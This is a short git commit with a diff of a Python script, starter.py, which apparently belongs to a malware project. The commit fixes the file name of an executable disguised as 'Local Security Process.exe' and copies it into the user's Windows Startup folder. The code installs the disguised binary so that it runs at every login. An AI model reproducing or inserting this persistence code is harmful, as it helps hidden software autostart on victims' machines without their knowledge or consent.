1f93f351a1fe56a74cbe1105dc5f5f8c2794c4cb
wankiet <ketowojec@gmail.com>
2021-05-29 09:37:03 +0200

    Typo

--- starter.py
+++ starter.py
@@ -4,6 +4,6 @@ import shutil
 
 username = getpass.getuser()
 
-src = os.getcwd() + "\Local Security Process"
+src = os.getcwd() + "\Local Security Process.exe"
 dest = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 shutil.copy(src, dest)
